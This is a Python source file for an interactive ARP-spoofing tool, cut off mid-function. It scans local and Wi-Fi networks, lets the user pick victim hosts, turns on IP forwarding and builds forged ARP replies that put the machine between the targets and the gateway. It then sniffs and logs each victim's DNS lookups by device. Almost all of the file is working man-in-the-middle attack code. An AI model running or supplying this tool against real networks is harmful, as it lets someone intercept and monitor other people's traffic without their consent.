#!/usr/bin/env python3

import os
import sys
import time
import socket
import threading
import subprocess
import logging
import ipaddress
import getpass
from dataclasses import dataclass, field
from datetime import datetime
from collections import Counter, defaultdict
from typing import Dict, List, Optional, Tuple

logging.basicConfig(level=logging.INFO, format="%(message)s")

COLOR_ENABLED = sys.stdout.isatty()
COLOR_RESET = "\033[0m" if COLOR_ENABLED else ""
COLOR_HEADER = "\033[36m" if COLOR_ENABLED else ""
COLOR_HIGHLIGHT = "\033[35m" if COLOR_ENABLED else ""
COLOR_SUCCESS = "\033[32m" if COLOR_ENABLED else ""
COLOR_WARNING = "\033[33m" if COLOR_ENABLED else ""
COLOR_ERROR = "\033[31m" if COLOR_ENABLED else ""
COLOR_DIM = "\033[90m" if COLOR_ENABLED else ""
STYLE_BOLD = "\033[1m" if COLOR_ENABLED else ""

DEFAULT_SCAN_SECONDS = 10
DEFAULT_WIFI_SCAN_SECONDS = 12
SPOOF_INTERVAL = 2.0
SCAN_BUSY_RETRY_DELAY = 0.8
SCAN_COMMAND_TIMEOUT = 4.0

FILTER_SUFFIXES = (
    "local",
    "lan",
    "arpa",
    "in-addr.arpa",
)

MODULE_DIR = os.path.dirname(os.path.abspath(__file__))
PROJECT_ROOT = os.path.dirname(MODULE_DIR)
LOG_DIR = os.path.join(PROJECT_ROOT, "log")

try:
    from scapy.all import ARP, Ether, AsyncSniffer, sendp, srp  # type: ignore
    from scapy.layers.dns import DNS, DNSQR  # type: ignore
    from scapy.layers.inet import IP  # type: ignore
    from scapy.layers.inet6 import IPv6  # type: ignore
    SCAPY_AVAILABLE = True
except Exception:
    SCAPY_AVAILABLE = False
    ARP = Ether = AsyncSniffer = sendp = srp = None  # type: ignore
    DNS = DNSQR = IP = IPv6 = object  # type: ignore


def color_text(text: str, color: str) -> str:
    return f"{color}{text}{COLOR_RESET}" if color else text


def style(text: str, *styles: str) -> str:
    prefix = "".join(s for s in styles if s)
    return f"{prefix}{text}{COLOR_RESET}" if prefix else text


def list_network_interfaces() -> List[str]:
    interfaces: List[str] = []
    ip_link = subprocess.run(["ip", "-o", "link", "show"], stdout=subprocess.PIPE, text=True, check=False)
    for line in ip_link.stdout.splitlines():
        if ": " in line:
            name = line.split(": ", 1)[1].split(":", 1)[0]
            if name and name != "lo":
                interfaces.append(name)
    return interfaces


def get_interface_chipset(interface: str) -> str:
    try:
        result = subprocess.run(
            ["ethtool", "-i", interface],
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True,
            check=False,
        )
    except FileNotFoundError:
        return "unknown"

    if result.returncode != 0:
        return "unknown"

    driver = None
    bus_info = None
    for line in result.stdout.splitlines():
        if line.startswith("driver:"):
            driver = line.split(":", 1)[1].strip()
        if line.startswith("bus-info:"):
            bus_info = line.split(":", 1)[1].strip()

    if driver and bus_info and bus_info != "":
        return f"{driver} ({bus_info})"
    if driver:
        return driver
    return "unknown"


def select_interface(interfaces: List[str]) -> str:
    if not interfaces:
        logging.error("No network interfaces found.")
        sys.exit(1)

    logging.info("")
    logging.info(style("Available interfaces:", STYLE_BOLD))
    for index, name in enumerate(interfaces, start=1):
        chipset = get_interface_chipset(name)
        label = f"{index}) {name} -"
        logging.info("  %s %s", color_text(label, COLOR_HIGHLIGHT), chipset)

    while True:
        choice = input(f"{style('Select interface', STYLE_BOLD)} (number or name): ").strip()
        if not choice:
            logging.warning("Please select an interface.")
            continue
        if choice.isdigit():
            idx = int(choice)
            if 1 <= idx <= len(interfaces):
                return interfaces[idx - 1]
        if choice in interfaces:
            return choice
        logging.warning("Invalid selection. Try again.")


def get_interface_ipv4_cidr(interface: str) -> Optional[str]:
    result = subprocess.run(
        ["ip", "-4", "addr", "show", "dev", interface],
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL,
        text=True,
        check=False,
    )
    for line in result.stdout.splitlines():
        line = line.strip()
        if line.startswith("inet "):
            parts = line.split()
            if len(parts) >= 2:
                return parts[1]
    return None


def get_default_gateway(interface: str) -> Optional[str]:
    result = subprocess.run(
        ["ip", "route", "show", "default", "dev", interface],
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL,
        text=True,
        check=False,
    )
    lines = result.stdout.splitlines() if result.stdout else []
    if not lines:
        result = subprocess.run(
            ["ip", "route", "show", "default"],
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True,
            check=False,
        )
        lines = result.stdout.splitlines() if result.stdout else []

    for line in lines:
        parts = line.split()
        if "via" in parts and "dev" in parts:
            try:
                via_index = parts.index("via") + 1
                dev_index = parts.index("dev") + 1
            except ValueError:
                continue
            if dev_index < len(parts) and via_index < len(parts):
                if parts[dev_index] == interface:
                    return parts[via_index]
    return None


def wait_for_gateway(interface: str, timeout: float = 6.0) -> Optional[str]:
    start = time.time()
    while time.time() - start < timeout:
        gateway = get_default_gateway(interface)
        if gateway:
            return gateway
        time.sleep(0.5)
    return None


def is_valid_gateway_ip(gateway: str, local_ip: Optional[str] = None) -> bool:
    try:
        ip_addr = ipaddress.ip_address(gateway)
    except ValueError:
        return False
    if ip_addr.version != 4:
        return False
    if ip_addr.is_unspecified or ip_addr.is_loopback:
        return False
    if local_ip and gateway == local_ip:
        return False
    return True


def collect_gateway_candidates(interface: str, cidr: Optional[str], local_ip: Optional[str]) -> List[str]:
    candidates: List[str] = []
    seen: set = set()

    def add_candidate(ip_text: Optional[str]) -> None:
        if not ip_text:
            return
        if not is_valid_gateway_ip(ip_text, local_ip):
            return
        if ip_text in seen:
            return
        seen.add(ip_text)
        candidates.append(ip_text)

    add_candidate(get_default_gateway(interface))

    result = subprocess.run(
        ["ip", "route", "show", "dev", interface],
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL,
        text=True,
        check=False,
    )
    for line in result.stdout.splitlines():
        parts = line.split()
        if "via" in parts:
            try:
                add_candidate(parts[parts.index("via") + 1])
            except (ValueError, IndexError):
                continue

    result = subprocess.run(
        ["ip", "neigh", "show", "dev", interface],
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL,
        text=True,
        check=False,
    )
    for line in result.stdout.splitlines():
        parts = line.split()
        if parts:
            add_candidate(parts[0])

    if cidr:
        try:
            network = ipaddress.ip_network(cidr, strict=False)
        except ValueError:
            network = None
        if isinstance(network, ipaddress.IPv4Network):
            for offset in (1, 254):
                candidate = network.network_address + offset
                if candidate in network:
                    add_candidate(str(candidate))

    return candidates


def prompt_gateway_manual(local_ip: Optional[str]) -> str:
    while True:
        gateway = input(f"{style('Enter gateway IP', STYLE_BOLD)}: ").strip()
        if not gateway:
            logging.warning("Gateway cannot be empty.")
            continue
        if is_valid_gateway_ip(gateway, local_ip):
            return gateway
        logging.warning("Invalid gateway IP. Try again.")


def prompt_gateway_with_help(interface: str, cidr: Optional[str], local_ip: Optional[str]) -> str:
    while True:
        candidates = collect_gateway_candidates(interface, cidr, local_ip)
        annotated: List[Tuple[str, Optional[str]]] = []
        for ip_text in candidates:
            annotated.append((ip_text, resolve_mac(ip_text, interface)))

        annotated.sort(key=lambda item: (item[1] is None, item[0]))

        if annotated:
            logging.info("")
            logging.info(style("Gateway not detected. Candidates:", STYLE_BOLD))
            for index, (ip_text, mac) in enumerate(annotated, start=1):
                status = mac if mac else "no response"
                label = f"{index}) {ip_text} -"
                logging.info("  %s %s", color_text(label, COLOR_HIGHLIGHT), status)

            best_ip = annotated[0][0]
            choice = input(
                f"{style('Select gateway', STYLE_BOLD)} "
                f"({style('Enter', STYLE_BOLD)} for {style(best_ip, COLOR_SUCCESS, STYLE_BOLD)}, "
                "number, M manual, R retry): "
            ).strip().lower()

            if choice == "":
                return best_ip
            if choice == "m":
                return prompt_gateway_manual(local_ip)
            if choice == "r":
                gateway = wait_for_gateway(interface, timeout=4.0)
                if gateway:
                    return gateway
                continue
            if choice.isdigit():
                idx = int(choice)
                if 1 <= idx <= len(annotated):
                    return annotated[idx - 1][0]
            logging.warning("Invalid selection. Try again.")
            continue

        logging.warning("Gateway not detected automatically.")
        return prompt_gateway_manual(local_ip)


def get_interface_mac(interface: str) -> Optional[str]:
    path = f"/sys/class/net/{interface}/address"
    try:
        with open(path, "r", encoding="utf-8") as handle:
            return handle.read().strip()
    except OSError:
        return None


def resolve_mac(ip_addr: str, interface: str, timeout: float = 2.0) -> Optional[str]:
    try:
        packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_addr)
        answered, _ = srp(packet, timeout=timeout, retry=1, iface=interface, verbose=0)
        for _, recv in answered:
            return recv.hwsrc
    except Exception:
        return None
    return None


def get_neighbor_mac(ip_addr: str, interface: str) -> Optional[str]:
    result = subprocess.run(
        ["ip", "neigh", "show", "dev", interface],
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL,
        text=True,
        check=False,
    )
    for line in result.stdout.splitlines():
        if not line.startswith(f"{ip_addr} "):
            continue
        parts = line.split()
        if "lladdr" in parts:
            try:
                return parts[parts.index("lladdr") + 1]
            except (ValueError, IndexError):
                continue
    return None


def resolve_mac_with_fallback(ip_addr: str, interface: str) -> Optional[str]:
    mac = resolve_mac(ip_addr, interface)
    if mac:
        return mac
    return get_neighbor_mac(ip_addr, interface)


def resolve_hostname(ip_addr: str) -> str:
    try:
        hostname = socket.gethostbyaddr(ip_addr)[0]
        if hostname:
            return hostname.split(".")[0]
    except Exception:
        pass
    if "." in ip_addr:
        return f"client_{ip_addr.split('.')[-1]}"
    return ip_addr


def enable_ip_forwarding() -> Optional[str]:
    path = "/proc/sys/net/ipv4/ip_forward"
    try:
        with open(path, "r", encoding="utf-8") as handle:
            original = handle.read().strip()
        with open(path, "w", encoding="utf-8") as handle:
            handle.write("1")
        return original
    except OSError:
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], stderr=subprocess.DEVNULL)
        return None


def restore_ip_forwarding(original: Optional[str]) -> None:
    if original is None:
        return
    path = "/proc/sys/net/ipv4/ip_forward"
    try:
        with open(path, "w", encoding="utf-8") as handle:
            handle.write(original)
    except OSError:
        subprocess.run(["sysctl", "-w", f"net.ipv4.ip_forward={original}"], stderr=subprocess.DEVNULL)


def is_tool_available(tool: str) -> bool:
    return subprocess.run(["which", tool], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode == 0


def run_nmtui() -> bool:
    if not is_tool_available("nmtui"):
        logging.warning("nmtui not available.")
        return False
    if not sys.stdin.isatty():
        logging.warning("nmtui requires a TTY.")
        return False
    logging.info("Launching nmtui... exit to return here.")
    try:
        subprocess.run(["nmtui"], check=False)
    except Exception as exc:
        logging.error("Failed to launch nmtui: %s", exc)
        return False
    return True


def is_scan_busy_error(stderr: str) -> bool:
    if not stderr:
        return False
    lower = stderr.lower()
    return "resource busy" in lower or "device or resource busy" in lower or "(-16)" in lower


def is_wireless_interface(interface: str) -> bool:
    if os.path.isdir(f"/sys/class/net/{interface}/wireless"):
        return True
    try:
        result = subprocess.run(
            ["iw", "dev", interface, "info"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            text=True,
            check=False,
        )
    except FileNotFoundError:
        return False
    return result.returncode == 0


def ensure_interface_ready_for_wifi(interface: str) -> None:
    subprocess.run(["ip", "link", "set", interface, "up"], stderr=subprocess.DEVNULL)
    try:
        result = subprocess.run(
            ["iw", "dev", interface, "info"],
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True,
            check=False,
        )
    except FileNotFoundError:
        return
    if result.returncode != 0:
        return
    if "type monitor" in result.stdout:
        logging.info("Switching %s to managed mode for Wi-Fi connection.", interface)
        subprocess.run(["ip", "link", "set", interface, "down"], stderr=subprocess.DEVNULL)
        subprocess.run(["iw", "dev", interface, "set", "type", "managed"], stderr=subprocess.DEVNULL)
        subprocess.run(["ip", "link", "set", interface, "up"], stderr=subprocess.DEVNULL)


def wait_for_ipv4(interface: str, timeout: float = 20.0) -> Optional[str]:
    start = time.time()
    while time.time() - start < timeout:
        cidr = get_interface_ipv4_cidr(interface)
        if cidr:
            return cidr
        time.sleep(0.5)
    return None


def scan_wireless_networks_iw(
    interface: str,
    duration_seconds: int,
    show_progress: bool = False,
) -> List[Dict[str, Optional[float]]]:
    end_time = time.time() + max(1, duration_seconds)
    networks: Dict[str, Dict[str, Optional[float]]] = {}
    last_remaining = None
    while time.time() < end_time:
        if show_progress and COLOR_ENABLED:
            remaining = max(0, int(end_time - time.time()))
            if remaining != last_remaining:
                last_remaining = remaining
                message = (
                    f"{style('Scanning', STYLE_BOLD)}... "
                    f"{style(str(remaining), COLOR_SUCCESS, STYLE_BOLD)}s remaining"
                )
                sys.stdout.write("\r" + message)
                sys.stdout.flush()
        try:
            remaining_time = end_time - time.time()
            if remaining_time <= 0:
                break
            timeout_seconds = max(1.0, min(SCAN_COMMAND_TIMEOUT, remaining_time))
            result = subprocess.run(
                ["iw", "dev", interface, "scan"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                timeout=timeout_seconds,
                check=False,
            )
        except FileNotFoundError:
            logging.error("Required tool 'iw' not found!")
            if show_progress and COLOR_ENABLED:
                sys.stdout.write("\n")
            return []
        except subprocess.TimeoutExpired:
            time.sleep(0.2)
            continue

        if result.returncode != 0:
            err_text = result.stderr.strip()
            if is_scan_busy_error(err_text):
                time.sleep(SCAN_BUSY_RETRY_DELAY)
                continue
            logging.error("Wireless scan failed: %s", err_text or "unknown error")
            if show_progress and COLOR_ENABLED:
                sys.stdout.write("\n")
            return []

        current_signal: Optional[float] = None
        for raw_line in result.stdout.splitlines():
            line = raw_line.strip()
            if line.startswith("BSS "):
                current_signal = None
                continue
            if line.startswith("signal:"):
                parts = line.split()
                try:
                    current_signal = float(parts[1])
                except (IndexError, ValueError):
                    current_signal = None
                continue
            if line.startswith("SSID:"):
                ssid = line.split(":", 1)[1].strip()
                if not ssid:
                    ssid = "<hidden>"
                existing = networks.get(ssid)
                if existing is None or (
                    current_signal is not None
                    and (existing["signal"] is None or current_signal > existing["signal"])
                ):
                    networks[ssid] = {"ssid": ssid, "signal": current_signal}

        time.sleep(0.2)

    if show_progress and COLOR_ENABLED:
        sys.stdout.write("\n")

    return sorted(
        networks.values(),
        key=lambda item: item["signal"] if item["signal"] is not None else -1000,
        reverse=True,
    )


def scan_wireless_networks_nmcli(
    interface: str,
    timeout_seconds: float = 6.0,
) -> List[Dict[str, Optional[float]]]:
    try:
        subprocess.run(
            ["nmcli", "dev", "wifi", "rescan", "ifname", interface],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=timeout_seconds,
            check=False,
        )
        result = subprocess.run(
            ["nmcli", "-t", "-f", "SSID,SIGNAL", "dev", "wifi", "list", "ifname", interface],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=timeout_seconds,
            check=False,
        )
    except FileNotFoundError:
        return []
    except subprocess.TimeoutExpired:
        return []

    if result.returncode != 0:
        return []

    networks: Dict[str, Dict[str, Optional[float]]] = {}
    for raw_line in result.stdout.splitlines():
        if not raw_line.strip():
            continue
        parts = raw_line.split(":", 1)
        if len(parts) != 2:
            continue
        ssid_raw, signal_raw = parts
        ssid_clean = ssid_raw.replace("\\:", ":").strip()
        ssid_val = ssid_clean if ssid_clean else "<hidden>"
        try:
            pct = float(signal_raw.strip())
        except ValueError:
            pct = None
        signal_dbm = (pct / 2.0) - 100.0 if pct is not None else None
        existing = networks.get(ssid_val)
        if existing is None or (
            signal_dbm is not None
            and (existing["signal"] is None or signal_dbm > existing["signal"])
        ):
            networks[ssid_val] = {"ssid": ssid_val, "signal": signal_dbm}

    return sorted(
        networks.values(),
        key=lambda item: item["signal"] if item["signal"] is not None else -1000,
        reverse=True,
    )


def scan_wireless_networks(
    interface: str,
    duration_seconds: int,
    show_progress: bool = False,
) -> List[Dict[str, Optional[float]]]:
    if is_tool_available("iw"):
        networks = scan_wireless_networks_iw(interface, duration_seconds, show_progress)
        if networks:
            return networks
    return scan_wireless_networks_nmcli(interface, timeout_seconds=min(6.0, max(2.0, duration_seconds)))


def prompt_manual_ssid() -> str:
    while True:
        manual = input(f"{style('Enter SSID', STYLE_BOLD)}: ").strip()
        if manual:
            return manual
        logging.warning("SSID cannot be empty.")


def select_network_ssid(interface: str, duration_seconds: int) -> Optional[Tuple[str, bool]]:
    while True:
        networks = scan_wireless_networks(interface, duration_seconds, show_progress=True)
        if not networks:
            logging.warning("No networks found during scan.")
            choice = input(
                f"{style('Rescan', STYLE_BOLD)} (R), "
                f"{style('Manual SSID', STYLE_BOLD)} (M), "
                f"or {style('Exit', STYLE_BOLD)} (E): "
            ).strip().lower()
            if choice == "r":
                continue
            if choice == "m":
                return prompt_manual_ssid(), True
            return None

        logging.info("")
        logging.info(style("Available networks:", STYLE_BOLD))
        for index, network in enumerate(networks, start=1):
            signal = (
                f"{network['signal']:.1f} dBm"
                if network["signal"] is not None
                else "signal unknown"
            )
            label = f"{index}) {network['ssid']} -"
            logging.info("  %s %s", color_text(label, COLOR_HIGHLIGHT), signal)

        choice = input(
            f"{style('Select network', STYLE_BOLD)} (number, R to rescan, M for manual): "
        ).strip().lower()
        if choice == "r":
            continue
        if choice == "m":
            return prompt_manual_ssid(), True
        if choice.isdigit():
            idx = int(choice)
            if 1 <= idx <= len(networks):
                ssid = networks[idx - 1]["ssid"]
                if ssid in {"<hidden>", "<non-printable>"}:
                    logging.info("Selected hidden SSID. Please enter it manually.")
                    return prompt_manual_ssid(), True
                return ssid, False
        logging.warning("Invalid selection. Try again.")


def prompt_wifi_password(ssid: str) -> str:
    try:
        return getpass.getpass(f"{style('Wi-Fi password', STYLE_BOLD)} for {ssid} (leave empty for open): ")
    except (EOFError, KeyboardInterrupt):
        return ""


def escape_wpa_value(value: str) -> str:
    return value.replace("\\", "\\\\").replace('"', '\\"')


def run_dhcp(interface: str) -> None:
    if is_tool_available("dhclient"):
        try:
            subprocess.run(
                ["dhclient", "-1", interface],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=15,
                check=False,
            )
        except subprocess.TimeoutExpired:
            logging.warning("DHCP client timed out on %s (dhclient).", interface)
        return
    if is_tool_available("udhcpc"):
        try:
            subprocess.run(
                ["udhcpc", "-i", interface, "-n", "-q"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=15,
                check=False,
            )
        except subprocess.TimeoutExpired:
            logging.warning("DHCP client timed out on %s (udhcpc).", interface)
        return
    if is_tool_available("dhcpcd"):
        try:
            subprocess.run(
                ["dhcpcd", "-w", interface],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=15,
                check=False,
            )
        except subprocess.TimeoutExpired:
            logging.warning("DHCP client timed out on %s (dhcpcd).", interface)


def connect_wifi_nmcli(interface: str, ssid: str, password: str, hidden: bool) -> bool:
    def run_cmd(cmd: List[str]) -> Tuple[Optional[bool], str]:
        try:
            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=False)
        except FileNotFoundError:
            return None, "nmcli not found"
        if result.returncode == 0:
            return True, ""
        return False, (result.stderr.strip() or result.stdout.strip())

    base_cmd = ["nmcli", "dev", "wifi", "connect", ssid, "ifname", interface]
    if hidden:
        base_cmd.extend(["hidden", "yes"])

    if password:
        initial_cmd = base_cmd + ["password", password]
    else:
        initial_cmd = list(base_cmd)

    ok, error_text = run_cmd(initial_cmd)
    if ok is None:
        return False
    if ok:
        return True

    if "key-mgmt" in error_text and "missing" in error_text:
        if password:
            retry_cmd = base_cmd + ["wifi-sec.key-mgmt", "wpa-psk", "wifi-sec.psk", password]
        else:
            retry_cmd = base_cmd + ["wifi-sec.key-mgmt", "none"]
        ok, retry_error = run_cmd(retry_cmd)
        if ok is None:
            return False
        if ok:
            return True
        error_text = retry_error or error_text

    if error_text:
        logging.error("nmcli connect failed: %s", error_text)
    else:
        logging.error("nmcli connect failed.")
    return False


def connect_wifi_wpa_supplicant(interface: str, ssid: str, password: str, hidden: bool) -> bool:
    if not is_tool_available("wpa_supplicant"):
        return False

    escaped_ssid = escape_wpa_value(ssid)
    lines = ["network={", f'    ssid="{escaped_ssid}"']
    if hidden:
        lines.append("    scan_ssid=1")
    if password:
        escaped_psk = escape_wpa_value(password)
        lines.append(f'    psk="{escaped_psk}"')
    else:
        lines.append("    key_mgmt=NONE")
    lines.append("}")
    config_text = "\n".join(lines) + "\n"

    conf_path = f"/tmp/wpa_supplicant_{interface}.conf"
    try:
        with open(conf_path, "w", encoding="utf-8") as handle:
            handle.write(config_text)
        os.chmod(conf_path, 0o600)
    except OSError as exc:
        logging.error("Failed to write wpa_supplicant config: %s", exc)
        return False

    try:
        result = subprocess.run(
            ["wpa_supplicant", "-B", "-i", interface, "-c", conf_path],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            check=False,
        )
    except FileNotFoundError:
        return False

    if result.returncode != 0:
        error_text = result.stderr.strip() or result.stdout.strip()
        if error_text:
            logging.error("wpa_supplicant failed: %s", error_text)
        else:
            logging.error("wpa_supplicant failed to start.")
        return False

    run_dhcp(interface)
    return True


def connect_to_wifi(interface: str, ssid: str, password: str, hidden: bool) -> bool:
    ensure_interface_ready_for_wifi(interface)
    logging.info("Connecting to %s ...", style(ssid, COLOR_SUCCESS, STYLE_BOLD))
    if connect_wifi_nmcli(interface, ssid, password, hidden):
        return True
    if connect_wifi_wpa_supplicant(interface, ssid, password, hidden):
        return True
    logging.error("No supported Wi-Fi manager found (nmcli or wpa_supplicant).")
    return False


def ensure_interface_connected(interface: str) -> Optional[str]:
    cidr = get_interface_ipv4_cidr(interface)
    if cidr:
        return cidr

    maybe_warn_not_connected(interface)
    if not is_wireless_interface(interface):
        return None
    ensure_interface_ready_for_wifi(interface)

    if is_tool_available("nmtui"):
        choice = input(
            f"{style('Interface not connected.', STYLE_BOLD)} "
            f"{style('Open nmtui', STYLE_BOLD)}? (Y/N): "
        ).strip().lower()
        if choice in {"", "y", "yes"}:
            if run_nmtui():
                cidr = get_interface_ipv4_cidr(interface)
                if cidr:
                    return cidr

    while True:
        logging.info("")
        method = input(
            f"{style('Connect', STYLE_BOLD)} - "
            f"{style('Scan', STYLE_BOLD)} (S), {style('Manual', STYLE_BOLD)} (M), "
            f"or {style('nmtui', STYLE_BOLD)} (N): "
        ).strip().lower()
        hidden = False
        if method in {"s", "scan", ""}:
            scan_seconds = prompt_int(
                f"{style('Scan duration', STYLE_BOLD)} in seconds "
                f"({style('Enter', STYLE_BOLD)} for {style(str(DEFAULT_WIFI_SCAN_SECONDS), COLOR_SUCCESS, STYLE_BOLD)}): ",
                default=DEFAULT_WIFI_SCAN_SECONDS,
            )
            input(f"{style('Press Enter', STYLE_BOLD)} to scan networks on {interface}...")
            selected = select_network_ssid(interface, scan_seconds)
            if not selected:
                return None
            ssid, hidden = selected
        elif method in {"m", "manual"}:
            ssid = prompt_manual_ssid()
            hidden = True
        elif method in {"n", "nmtui"}:
            if run_nmtui():
                cidr = get_interface_ipv4_cidr(interface)
                if cidr:
                    return cidr
            logging.warning("No IPv4 address detected after nmtui.")
            continue
        else:
            logging.warning("Please enter S, M, or N.")
            continue

        password = prompt_wifi_password(ssid)
        if connect_to_wifi(interface, ssid, password, hidden):
            logging.info("Waiting for IPv4 address on %s ...", interface)
            cidr = wait_for_ipv4(interface, timeout=20.0)
            if cidr:
                return cidr
            logging.warning("No IPv4 address detected after connection.")
        retry = input(f"{style('Retry connection', STYLE_BOLD)}? (Y/N): ").strip().lower()
        if retry != "y":
            return None


def maybe_warn_not_connected(interface: str) -> None:
    ipv4 = get_interface_ipv4_cidr(interface)
    if not ipv4:
        logging.warning("No IPv4 address detected on %s. Make sure it is connected.", interface)


def arp_scan_hosts(interface: str, cidr: str, timeout: float = 2.0) -> List[Tuple[str, str, str]]:
    try:
        network = ipaddress.ip_network(cidr, strict=False)
    except ValueError:
        logging.error("Invalid CIDR: %s", cidr)
        return []

    if network.num_addresses > 1024:
        logging.warning("Large network detected (%s hosts).", network.num_addresses)
        confirm = input(f"{style('Continue scan', STYLE_BOLD)}? (Y/N): ").strip().lower()
        if confirm != "y":
            return []

    logging.info("")
    logging.info("Scanning network %s ...", network)
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=str(network))
    try:
        answered, _ = srp(packet, timeout=timeout, retry=1, iface=interface, verbose=0)
    except Exception as exc:
        logging.error("ARP scan failed: %s", exc)
        return []

    hosts: List[Tuple[str, str, str]] = []
    for _, recv in answered:
        ip_addr = recv.psrc
        mac_addr = recv.hwsrc
        hostname = resolve_hostname(ip_addr)
        hosts.append((ip_addr, mac_addr, hostname))

    hosts.sort(key=lambda item: item[0])
    return hosts


def select_targets_from_scan(
    hosts: List[Tuple[str, str, str]],
    local_ip: str,
    gateway_ip: str,
) -> List[Tuple[str, str, str]]:
    filtered = [host for host in hosts if host[0] not in {local_ip, gateway_ip}]
    if not filtered:
        logging.warning("No hosts found (excluding local IP and gateway).")
        return []

    logging.info("")
    logging.info(style("Discovered hosts:", STYLE_BOLD))
    for index, (ip_addr, mac_addr, hostname) in enumerate(filtered, start=1):
        label = f"{index}) {ip_addr} -"
        logging.info("  %s %s (%s)", color_text(label, COLOR_HIGHLIGHT), hostname, mac_addr)

    while True:
        choice = input(
            f"{style('Select targets', STYLE_BOLD)} (number, comma list, A for all, M for manual): "
        ).strip().lower()
        if choice == "a":
            return filtered
        if choice == "m":
            return []
        if choice:
            indices = []
            try:
                indices = [int(item.strip()) for item in choice.split(",") if item.strip()]
            except ValueError:
                indices = []
            if indices:
                selected = []
                for idx in indices:
                    if 1 <= idx <= len(filtered):
                        selected.append(filtered[idx - 1])
                if selected:
                    return selected
        logging.warning("Invalid selection. Try again.")


def parse_manual_targets(raw: str) -> List[str]:
    targets: List[str] = []
    for item in raw.split(","):
        ip_text = item.strip()
        if not ip_text:
            continue
        try:
            ipaddress.ip_address(ip_text)
        except ValueError:
            logging.warning("Invalid IP address: %s", ip_text)
            continue
        targets.append(ip_text)
    return targets


def prompt_manual_targets() -> List[str]:
    while True:
        raw = input(f"{style('Enter target IPs', STYLE_BOLD)} (comma separated): ").strip()
        targets = parse_manual_targets(raw)
        if targets:
            return targets
        logging.warning("No valid targets provided.")


def normalize_domain(domain: str) -> str:
    return domain.strip().rstrip(".").lower()


def should_skip_domain(domain: str) -> bool:
    if not domain:
        return True
    for suffix in FILTER_SUFFIXES:
        if domain == suffix or domain.endswith(f".{suffix}"):
            return True
    return False


@dataclass
class DNSQuery:
    timestamp: str
    ip: str
    device: str
    domain: str


@dataclass
class DNSSpoofState:
    queries: List[DNSQuery] = field(default_factory=list)
    device_names: Dict[str, str] = field(default_factory=dict)
    device_counts: Counter = field(default_factory=Counter)
    domain_counts: Counter = field(default_factory=Counter)


def show_live_header(interface: str, gateway_ip: str, target_count: int) -> None:
    logging.info("")
    logging.info(style("DNS Spoof - Live View", STYLE_BOLD))
    logging.info("Interface: %s", style(interface, COLOR_SUCCESS, STYLE_BOLD))
    logging.info("Gateway: %s", style(gateway_ip, COLOR_SUCCESS, STYLE_BOLD))
    logging.info("Targets: %s", style(str(target_count), COLOR_SUCCESS, STYLE_BOLD))
    logging.info("%s", color_text("Press Enter to stop.", COLOR_DIM))
    logging.info("")


def handle_dns_packet(packet, state: DNSSpoofState, state_lock: threading.Lock) -> None:
    try:
        if not packet.haslayer(DNSQR) or not packet.haslayer(DNS):
            return
        dns_layer = packet[DNS]
        if dns_layer.qr != 0:
            return
        domain_raw = packet[DNSQR].qname
        if not domain_raw:
            return
        domain = normalize_domain(domain_raw.decode("utf-8", errors="ignore"))
        if should_skip_domain(domain):
            return

        ip_addr = None
        if packet.haslayer(IP):
            ip_addr = packet[IP].src
        elif packet.haslayer(IPv6):
            ip_addr = packet[IPv6].src
        if not ip_addr:
            return

        with state_lock:
            device_name = state.device_names.get(ip_addr)
            if not device_name:
                device_name = resolve_hostname(ip_addr)
                state.device_names[ip_addr] = device_name

            device_label = f"{device_name} ({ip_addr})"
            timestamp = datetime.now().strftime("%H:%M:%S")
            state.queries.append(DNSQuery(timestamp=timestamp, ip=ip_addr, device=device_label, domain=domain))
            state.device_counts[device_label] += 1
            state.domain_counts[domain] += 1

        label = f"{device_label:30}"
        print(f"[{timestamp}] {label} -> {domain}", flush=True)
    except Exception:
        return


def run_dns_sniffer(interface: str, stop_event: threading.Event, state: DNSSpoofState) -> None:
    state_lock = threading.Lock()

    def packet_handler(packet) -> None:
        handle_dns_packet(packet, state, state_lock)

    try:
        sniffer = AsyncSniffer(
            iface=interface,
            prn=packet_handler,
            store=False,
            filter="udp port 53 or tcp port 53",
        )
        sniffer.start()
    except Exception as exc:
        logging.warning("BPF filter failed (%s). Falling back to unfiltered capture.", exc)
        try:
            sniffer = AsyncSniffer(
                iface=interface,
                prn=packet_handler,
                store=False,
            )
            sniffer.start()
        except Exception as fallback_exc:
            logging.error("Failed to start sniffer: %s", fallback_exc)
            stop_event.set()
            return

    while not stop_event.is_set():
        time.sleep(0.2)

    try:
        if sniffer and getattr(sniffer, "running", False):
            sniffer.stop()
    except Exception:
        pass


def build_spoof_packets(
    attacker_mac: str,
    gateway_ip: str,
    gateway_mac: str,
    target_ip: str,
    target_mac: str,
) -> Tuple[ARP, ARP]:
    to_target = ARP(
        op=2,
        pdst=target_ip,
        psrc=gateway_ip,
        hwdst=target_mac,
        hwsrc=attacker_mac,
    )
    to_gateway = ARP(
        op=2,
        pdst=gateway_ip,
        psrc=target_ip,
        hwdst=gateway_mac,
        hwsrc=attacker_mac,
    )
    return to_target, to_gateway


def build_restore_packets(
    gateway_ip: str,
    gateway_mac: str,
    target_ip: str,
    target_mac: str,
) -> Tuple[ARP, ARP]:
